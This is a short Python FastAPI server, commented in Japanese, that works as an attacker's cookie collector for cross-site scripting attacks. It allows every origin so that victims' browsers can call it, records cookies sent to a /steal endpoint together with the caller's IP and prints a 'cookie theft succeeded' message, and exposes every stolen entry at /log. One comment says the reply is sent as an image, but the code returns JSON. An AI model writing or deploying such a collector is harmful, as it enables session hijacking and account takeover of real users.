from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware

app = FastAPI()

# 被害者ブラウザからのリクエストを受け取るため全オリジン許可
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

stolen_cookies: list[dict] = []


@app.get("/steal")
def steal(c: str = "", request: Request = None):
    entry = {
        "cookie": c,
        "ip": request.client.host,
    }
    stolen_cookies.append(entry)
    print(f"[!!!] Cookie窃取成功: {c}")
    # 画像として返すことでブラウザのCORSエラーを回避
    return {"status": "ok"}


@app.get("/log")
def show_log():
    return {"stolen": stolen_cookies}
